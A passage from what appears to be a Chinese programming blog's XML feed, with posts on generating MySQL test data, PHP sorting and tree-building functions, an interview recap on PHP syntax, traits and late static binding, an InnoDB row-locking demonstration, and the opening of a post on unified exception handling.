&apos;&apos;), CONCAT(&apos;from_&apos;, floor(rand()*1000)), CONCAT(&apos;to_&apos;, floor(rand()*1000)),0, UNIX_TIMESTAMP(NOW()));</span><br><span class="line">        set num=num+1;</span><br><span class="line">        set track_while = floor(rand() * 10);</span><br><span class="line">        set track_num = 1;</span><br><span class="line">        while track_num &lt;= track_while do</span><br><span class="line">           INSERT INTO `test`.`track` ( `y`, `x`, `express_id`) VALUES (rand()*rand()*100, rand()*rand()*100, (select max(id)from express));</span><br><span class="line">           set track_num = track_num + 1;</span><br><span class="line">        end while;</span><br><span class="line">    end while;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">-- 导入</span><br><span class="line">call add_test_data();</span><br></pre></td></tr></table></figure></div>
<div class="note info">
            <p>有1亿条左右的数据，预计没有半天时间是生成不完的。</p>
          </div>
<p><img src="/images/1566528906.png" alt></p>
<div class="note info">
            <p>由于<code>innodb</code>要额外处理事务的索引，相对来说MyISAM 更快</p>
          </div>
<p><img src="/images/20190823124751.png" alt><br>从结果来说，主键联表查找有1千8百多万条数据表，和1亿多条的详情表中查询的速度是很快的。</p>
<div class="note info">
            <p>回到原来的问题，根据用户id即<code>uid</code>在千万条快递单子和上亿的轨迹查找用户的快递和快递详情。</p>
          </div>
<p><img src="/images/20190823133353.png" alt><br>结果是：0.001s.<br><img src="/images/20190823134028.png" alt><br>由于索引的起作用，仅扫描1到11行的数据。</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】算法</title>
    <url>/2019/08/20/%E3%80%90php%E3%80%91%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h3 id="冒泡从小到大排序"><a href="#冒泡从小到大排序" class="headerlink" title="冒泡从小到大排序"></a>冒泡从小到大排序</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">array</span>(<span class="number">23</span>,<span class="number">15</span>,<span class="number">43</span>,<span class="number">25</span>,<span class="number">54</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">82</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">32</span>,<span class="number">65</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($a) ; $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = $i+<span class="number">1</span>; $j &lt; count($a); $j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($a[$i] &gt; $a[$j]) &#123;</span><br><span class="line">            $tem = $a[$i]; </span><br><span class="line">            $a[$i] = $a[$j]; </span><br><span class="line">            $a[$j] = $tem; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h3 id="无限分级数组树"><a href="#无限分级数组树" class="headerlink" title="无限分级数组树"></a>无限分级数组树</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">function _arrToTree($items, $pid = &apos;parentId&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    $map  = [];</span><br><span class="line">    $tree = [];</span><br><span class="line">    foreach ($items as &amp;$it)&#123;</span><br><span class="line">        $el = &amp;$it;</span><br><span class="line">        $map[$it[&apos;id&apos;]] = &amp;$it;</span><br><span class="line">    &#125;  //数据的ID名生成新的引用索引树</span><br><span class="line">    foreach ($items as &amp;$it)&#123;</span><br><span class="line">        $parent = &amp;$map[$it[$pid]];</span><br><span class="line">        if($parent) &#123;</span><br><span class="line">            $parent[&apos;children&apos;][] = &amp;$it;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $tree[] = &amp;$it;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 例子</span><br><span class="line">$arr = [</span><br><span class="line">[&apos;id&apos; =&gt; 1, &apos;name&apos; =&gt; &apos;A1&apos;, &apos;parentId&apos; =&gt; 0],</span><br><span class="line">    [&apos;id&apos; =&gt; 2, &apos;name&apos; =&gt; &apos;A1-B1&apos;, &apos;parentId&apos; =&gt; 1],</span><br><span class="line">    [&apos;id&apos; =&gt; 3, &apos;name&apos; =&gt; &apos;A1-B2&apos;, &apos;parentId&apos; =&gt; 1],</span><br><span class="line">    [&apos;id&apos; =&gt; 4, &apos;name&apos; =&gt; &apos;A1-B2-C1&apos;, &apos;parentId&apos; =&gt; 3],</span><br><span class="line">    [&apos;id&apos; =&gt; 5, &apos;name&apos; =&gt; &apos;B1&apos;, &apos;parentId&apos; =&gt; 0],</span><br><span class="line">    // ...</span><br><span class="line">    ];</span><br><span class="line">    var_dump(_arrToTree($arr));</span><br><span class="line">    // 结果</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;id&quot;]=&gt;</span><br><span class="line">    int(1)</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(2) &quot;A1&quot;</span><br><span class="line">    [&quot;parentId&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;children&quot;]=&gt;</span><br><span class="line">    array(2) &#123;</span><br><span class="line">      [0]=&gt;</span><br><span class="line">      array(3) &#123;</span><br><span class="line">        [&quot;id&quot;]=&gt;</span><br><span class="line">        int(2)</span><br><span class="line">        [&quot;name&quot;]=&gt;</span><br><span class="line">        string(5) &quot;A1-B1&quot;</span><br><span class="line">        [&quot;parentId&quot;]=&gt;</span><br><span class="line">        int(1)</span><br><span class="line">      &#125;</span><br><span class="line">      [1]=&gt;</span><br><span class="line">      array(4) &#123;</span><br><span class="line">        [&quot;id&quot;]=&gt;</span><br><span class="line">        int(3)</span><br><span class="line">        [&quot;name&quot;]=&gt;</span><br><span class="line">        string(5) &quot;A1-B2&quot;</span><br><span class="line">        [&quot;parentId&quot;]=&gt;</span><br><span class="line">        int(1)</span><br><span class="line">        [&quot;children&quot;]=&gt;</span><br><span class="line">        array(1) &#123;</span><br><span class="line">          [0]=&gt;</span><br><span class="line">          array(3) &#123;</span><br><span class="line">            [&quot;id&quot;]=&gt;</span><br><span class="line">            int(4)</span><br><span class="line">            [&quot;name&quot;]=&gt;</span><br><span class="line">            string(8) &quot;A1-B2-C1&quot;</span><br><span class="line">            [&quot;parentId&quot;]=&gt;</span><br><span class="line">            int(3)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  array(3) &#123;</span><br><span class="line">    [&quot;id&quot;]=&gt;</span><br><span class="line">    int(5)</span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(2) &quot;B1&quot;</span><br><span class="line">    [&quot;parentId&quot;]=&gt;</span><br><span class="line">    int(0)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <tags>
        <tag>php算法</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】职生涯第5次php面试记录</title>
    <url>/2019/08/03/%E3%80%90PHP%E3%80%91%E7%AC%AC5%E6%AC%A1php%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>刚面试回来。就结果来说，10道题目只答对了2道确实很尴尬的结果。面试官很清楚自己要问什么 ，也很有耐心，反观我这边在<br>自己介绍这块说了一堆让人插不下话的废话确实失礼。可是要怎么说才好呢？唉！ 整个过程下来30分钟，人家有给提示是自己没把<br>握到点,给人一种“我想拉你一把，可你不给力”的样子。虽然他问的<code>if</code>和<code>for</code>的流程控制时，一时间我就怀疑他在耍我,这<br>不废话吗。小学生都能回答的事， 居然问了，结果小学生真的比我强，<code>for</code> 也有不用花括号的写法，而我回答不上。尴尬啊,<br>黑历史诞生了！！！   好,现在来复盘:<br>  <a id="more"></a></p>
<h4 id="1-流程控制符不用花括号的写法。"><a href="#1-流程控制符不用花括号的写法。" class="headerlink" title="1, 流程控制符不用花括号的写法。"></a>1, 流程控制符不用花括号的写法。</h4> <div class="note info">
            <p>刚才开始也闹不明白为什么非要不用花括号的写法，结合面试官说的“模板引擎”这个关键词回忆下，在使用框架的时候模板<br>的时候，<code>html</code>混合<code>php</code>的时候就是用这种替代写法，感觉更像是一种<code>html</code>的默认写法规范，</p>
          </div> 
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  if 流程控制</span></span><br><span class="line"><span class="keyword">if</span> (expr) :</span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line"><span class="keyword">elseif</span> (expr):</span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  for 流程控制</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">3</span>; $i++) :</span><br><span class="line">    <span class="keyword">print</span>($i) . PHP_EOL;</span><br><span class="line"><span class="keyword">endfor</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach 流程控制</span></span><br><span class="line"><span class="keyword">foreach</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="keyword">as</span> $v) :</span><br><span class="line">    <span class="keyword">print</span>($v) . PHP_EOL;</span><br><span class="line"><span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// while 流程控制</span></span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ($i &lt;= <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">print</span> $i;</span><br><span class="line">    $i++;</span><br><span class="line"><span class="keyword">endwhile</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其它</span></span><br><span class="line">swithc(expr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'foot'</span> :  </span><br><span class="line">        <span class="comment">// do sth ;</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> </span><br><span class="line">    ...    </span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">endswitch</span></span><br></pre></td></tr></table></figure></div>
<h4 id="2-关于数组比较运算符-和"><a href="#2-关于数组比较运算符-和" class="headerlink" title="2,关于数组比较运算符 === 和 =="></a>2,关于数组比较运算符 === 和 ==</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var_dump([<span class="string">'a'</span>=&gt;<span class="number">1</span>, <span class="string">'b'</span>=&gt;<span class="number">2</span>] === [<span class="string">'b'</span>=&gt;<span class="number">2</span>, <span class="string">'a'</span>=&gt;<span class="number">1</span>]);  <span class="comment">// 顺序不一致 false</span></span><br><span class="line">var_dump([<span class="string">'a'</span>=&gt;<span class="number">1</span>, <span class="string">'b'</span>=&gt;<span class="number">2</span>] === [ <span class="string">'a'</span>=&gt;<span class="number">1</span>, <span class="string">'b'</span>=&gt;<span class="number">2</span>]); <span class="comment">// 值和排序一致 true</span></span><br><span class="line"></span><br><span class="line">var_dump([<span class="string">'a'</span>=&gt;<span class="number">1</span>, <span class="string">'b'</span>=&gt;<span class="number">2</span>] == [<span class="string">'b'</span>=&gt;<span class="number">2</span>, <span class="string">'a'</span>=&gt;<span class="number">1</span>]);  <span class="comment">// 值一致不要求顺序一致 true</span></span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 3, 代码复用`trait`</span></span><br><span class="line">`<span class="keyword">trait</span>` 代码复用这个之前用过，不过面试时没及时想起来，很尴尬。现在再折腾下吧。</span><br><span class="line">既然要折腾那就找个方向吧，官方文档说了，`<span class="keyword">trait</span> `可以解除`php`类的单继承限制,那么这个解除单继承</span><br><span class="line">能不能理解为其它在类里`<span class="keyword">use</span>`复用一个代码块其实就是继承一个类呢，而`<span class="title">trait</span>`其实可以看作一个类呢？</span><br><span class="line">就先这样假设吧？ 那既然`<span class="title">trait</span>`是个类，那么就应该拥有类的特有的魔术方法。</span><br><span class="line"></span><br><span class="line">``` <span class="title">php</span> </span><br><span class="line">    //  在<span class="title">trait</span> 和类同时使用 构造方法和析构方法</span><br><span class="line">     <span class="title">Trait</span> <span class="title">TraitA</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="title">public</span> $<span class="title">foo</span>;</span><br><span class="line">     </span><br><span class="line">         <span class="comment">//  traitA赋值 $foo</span></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;foo = <span class="string">'to set value by TraitA'</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">     </span>&#123;</span><br><span class="line">         <span class="keyword">use</span>  <span class="title">TraitA</span>;</span><br><span class="line">         <span class="comment">// 类如果上面的TraitA不执行构造方法，那本就赋值</span></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;foo  = <span class="keyword">$this</span>-&gt;foo ?? <span class="string">'to set value TestClass'</span>;</span><br><span class="line">     </span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">print</span> (<span class="keyword">new</span> Test())-&gt;foo . PHP_EOL;  <span class="comment">//  打印 to set value TestClass</span></span><br></pre></td></tr></table></figure></div>
<p>结果很透明 <code>Test</code>类覆盖了 <code>TraitA</code>的方法，从而修改的<code>foo</code>参数，这不类继承和覆盖一样的吗?<br>所以当下估且可以把<code>trait</code>看作是一个类，毕竟还有其的魔术方法还没测试。<br>好，下一步来看看，复用2个 <code>trait</code>，并写起冲突的方法。看看怎么样。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  在trait 和类同时使用 构造方法和析构方法</span></span><br><span class="line"><span class="keyword">Trait</span> TraitA</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> $foo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  traitA赋值 $foo</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="string">'to set value by TraitA'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Trait</span> TraitB</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> $foo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  traitA赋值 $foo</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo = <span class="string">'to set value by TraitA'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span>  <span class="title">TraitA</span>, <span class="title">TraitB</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="keyword">new</span> Test())-&gt;foo . PHP_EOL;  <span class="comment">// PHP Fatal error:  Trait method __construct has not been applied, because there are collisions with other trait methods on Test in /home/http/tmp/tmp.php on line 25</span></span><br></pre></td></tr></table></figure></div></p>
<p>结果还是报错了，果然这点会起冲突跟类的单例继承不一样。也可能是多类该有的现象。后面再观察下吧。</p>
<h4 id="4-方法内的static关键字"><a href="#4-方法内的static关键字" class="headerlink" title="4, 方法内的static关键字"></a>4, 方法内的static关键字</h4><p>这个知识点以前学习过，不过忘记了。所以这个不意外，真回答不了。<br> <code>static</code> 和<code>self</code>都是对当前类的引用，不过<code>self</code>比较死板，<code>self</code>写在哪个类就代表哪个类，<br> 如果哪个类刚好有可以调用的方法和属性就调用，没有就报错，哪怕你在当前类把没有属性补充上也没用。<br> 而<code>static</code>跟<code>self</code>一样，不过灵活很多，用<code>static</code>调用东西，它会一由本类往上游的继承的方向找，直到<br> 找到要调用的方法然后就调用。找不到就报错误。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">testStatic</span><span class="params">()</span> </span>&#123; <span class="keyword">static</span>::printClassName(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">testSelf</span><span class="params">()</span> </span>&#123;   <span class="keyword">self</span>::printClassName(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">printClassName</span><span class="params">()</span> </span>&#123; <span class="keyword">print</span> <span class="string">'A'</span> . PHP_EOL; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">printClassName</span><span class="params">()</span> </span>&#123; <span class="keyword">print</span> <span class="string">'B'</span> . PHP_EOL; &#125;</span><br><span class="line">&#125;</span><br><span class="line">B::testStatic();  <span class="comment">// print B</span></span><br><span class="line">B::testSelf();    <span class="comment">// print A</span></span><br></pre></td></tr></table></figure></div></p>
<h4 id="5-抽象类"><a href="#5-抽象类" class="headerlink" title="5 抽象类"></a>5 抽象类</h4><h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6 接口"></a>6 接口</h4><h4 id="7-把对象当参数传到方法有什么不同"><a href="#7-把对象当参数传到方法有什么不同" class="headerlink" title="7 把对象当参数传到方法有什么不同"></a>7 把对象当参数传到方法有什么不同</h4><h4 id="8-php-内置引擎模板和rquire"><a href="#8-php-内置引擎模板和rquire" class="headerlink" title="8 php 内置引擎模板和rquire"></a>8 php 内置引擎模板和rquire</h4><h4 id="9-php-匿名的使用"><a href="#9-php-匿名的使用" class="headerlink" title="9 php 匿名的使用"></a>9 php 匿名的使用</h4>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>【mysql】锁机制初探</title>
    <url>/2019/08/02/%E3%80%90mysql%E3%80%91%E9%94%81%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="概念和应用场景"><a href="#概念和应用场景" class="headerlink" title="概念和应用场景"></a>概念和应用场景</h4><hr>
<p><code>mysql</code>支持多线程访问,可以同时处理多个用户提交的请求。在高并发的时候多个连接会 话在同一时间内发<br>起数据的操作。如：在商品表中有1个抢购的商品,<code>foo</code>和<code>bar</code>这2个用 户在同一时间内抢购,<code>foo</code>先抢到了<br>，但在数据库还没来得及修改商品的数量修改为0的时候， <code>bar</code>也已经成功抢了1个，这时候出现了1个商品<br>却被抢了2次商品。这数据是不对的，这就是脏读,而<code>InoDB</code>引擎的锁机制能解决这个问题。即，当一个会话<br>在进行操作的时候，后面的请求在操作提交或 事务回滚前，其它后面的用户操作是不会进行操作的，直到完<br>成，才进行下一个，从而保证 了数据的准确。<br><a id="more"></a></p>
<h5 id="生成测试数据"><a href="#生成测试数据" class="headerlink" title="生成测试数据"></a>生成测试数据</h5><p>先来做个测试，来直观感觉下。开始前先创建个<code>test</code>测试数据库和<code>demo</code>表来演示。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create databse test;  </span><br><span class="line">use test;</span><br><span class="line">CREATE TABLE `test`.demo </span><br><span class="line">( </span><br><span class="line">`id` INT(10) NOT NULL AUTO_INCREMENT , </span><br><span class="line">`name` VARCHAR(80) NOT NULL , PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE = InnoDB;</span><br><span class="line">--- 加入3条数据</span><br><span class="line">INSERT INTO `test`.`demo` (`id`, `name`) </span><br><span class="line">VALUE </span><br><span class="line">(NULL, &apos;A&apos;), (NULL, &apos;B&apos;), (NULL, &apos;C&apos;);</span><br><span class="line">SET AUTOCOMMIT = 0; --- 关闭自动提交,开启事务</span><br></pre></td></tr></table></figure></div></p>
<h5 id="A和B窗口会话"><a href="#A和B窗口会话" class="headerlink" title="A和B窗口会话"></a>A和B窗口会话</h5><p>目前为止我们的所有操作都是在一个窗口(第一个)下操作的，下文称<strong><em>A窗口</em></strong>.<br>好，现在我们查看到的数据是这样的。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM  `test`.`demo`;</span><br><span class="line">+----+------+</span><br><span class="line">| id | name |</span><br><span class="line">+----+------+</span><br><span class="line">|  1 | A    |</span><br><span class="line">|  2 | B    |</span><br><span class="line">|  3 | C    |</span><br><span class="line">+----+------+</span><br></pre></td></tr></table></figure></div></p>
<p>然后对第一条数据行修改,并查看下<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">UPDATE `test`.`demo` SET `name` = &apos;I am A bebore to change&apos; WHERE `id` = 1;</span><br><span class="line">SELECT * FROM `demo`;</span><br><span class="line">+----+-------------------------+</span><br><span class="line">| id | name                    |</span><br><span class="line">+----+-------------------------+</span><br><span class="line">|  1 | I am A bebore to change |</span><br><span class="line">|  2 | B                       |</span><br><span class="line">|  3 | C                       |</span><br><span class="line">+----+-------------------------+</span><br></pre></td></tr></table></figure></div></p>
<p>结果很明显，数据已经发生改变了。<br><div class="note warning">
            <p>注意啊，画重点的来了。</p>
          </div><br>然后再打开一个新的窗口，下文称<strong><em>B窗口</em></strong><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use `test`;</span><br><span class="line">SELECT * FROM `test`.`demo`;</span><br><span class="line">+----+------+</span><br><span class="line">| id | name |</span><br><span class="line">+----+------+</span><br><span class="line">|  1 | A    |</span><br><span class="line">|  2 | B    |</span><br><span class="line">|  3 | C    |</span><br><span class="line">+----+------+</span><br><span class="line">UPDATE `test`.`demo` SET `name` = &apos;B windows go to changing id 1&apos; WHERE `id` = 1;</span><br></pre></td></tr></table></figure></div></p>
<p>显然<strong><em>A窗口</em></strong>修改并没有生效，<strong><em>B窗口</em></strong>就这个事务的隔离后面再说。然后<strong><em>B窗口</em></strong>就一直卡在这里了。 甚至超时而执行失败。<br>如果这时候把回到A窗口的事务提交下.<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">UPDATE `test`.`demo` SET `name` = &apos;I am A bebore to change&apos; WHERE `id` = 1;</span><br><span class="line">SELECT * FROM `demo`;</span><br><span class="line">+----+-------------------------+</span><br><span class="line">| id | name                    |</span><br><span class="line">+----+-------------------------+</span><br><span class="line">|  1 | I am A bebore to change |</span><br><span class="line">|  2 | B                       |</span><br><span class="line">|  3 | C                       |</span><br><span class="line">+----+-------------------------+</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure></div></p>
<p>由于A窗口的事务已经不占用那条记录了，那B窗口自然可以执行下去。</p>
<p>其实<strong><em>B窗口</em></strong>操作的数据行和A窗口是一样。B窗口卡在这里是等A窗口执行完成后，才轮到B窗口来操作。<br>而B个窗口执行的更新语句也成功执行了。并修改成功了<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use `test`;</span><br><span class="line">SELECT * FROM `test`.`demo`;</span><br><span class="line">+----+------+</span><br><span class="line">| id | name |</span><br><span class="line">+----+------+</span><br><span class="line">|  1 | A    |</span><br><span class="line">|  2 | B    |</span><br><span class="line">|  3 | C    |</span><br><span class="line">+----+------+</span><br><span class="line">UPDATE `test`.`demo` SET `name` = &apos;B windows go to changing id 1&apos; WHERE `id` = 1;</span><br><span class="line">Query OK, 1 row affected (11.196 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line">SELECT * FROM `test`.`demo`;</span><br><span class="line"></span><br><span class="line">+----+-------------------------------+</span><br><span class="line">| id | name                          |</span><br><span class="line">+----+-------------------------------+</span><br><span class="line">|  1 | B windows go to changing id 1 |</span><br><span class="line">|  2 | B                             |</span><br><span class="line">|  3 | C                             |</span><br><span class="line">+----+-------------------------------+</span><br><span class="line">3 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">commit;</span><br></pre></td></tr></table></figure></div></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><hr>
<p>锁机制保证了数据的准确性,防止数据同时操作而导致脏读的情况。</p>
<p> 感谢后盾人提供这么好的学习视频。 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaG91ZHVucmVuLmNvbS8=" title="https://www.houdunren.com/">https://www.houdunren.com/<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql锁</tag>
        <tag>InnoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】异常统一处理</title>
    <url>/2019/07/27/%E3%80%90php%E3%80%91%E5%BC%82%E5%B8%B8%E7%BB%9F%E4%B8%80%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p><code>php</code> 异常处理以前是这样的。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// may be thrwo exception </span></span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="comment">// catch the exception </span></span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// to run ,don`t  care of any gexception </span></span><br><span class="line">    <span class="comment">// ... do sth</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<div class="note info">
            <p>以上有什么问吗？ 有。太他妈烦了，我要有10个地方可能抛异常，10个地方这样整也不好, 太<br>烦了。 那能不能代码复用，统一处理，还可以做下日志记录啥的？嘿嘿__!行的！ 既然要玩那就做个正经些的<code>demo</code>。<br>上<code>composer</code>.</p>
          </div>
<a id="more"></a>
<h3 id="1创建demo"><a href="#1创建demo" class="headerlink" title="1创建demo"></a>1创建demo</h3><ul>
<li>1.1 <code>make demo &amp;&amp; cd demo</code>; 创建demo项目，并进入项目根目录</li>
<li>1.2 <code>composer init</code>;或许要输入姓名和邮箱其它啥也不用管，一路开车<code>enter</code>.</li>
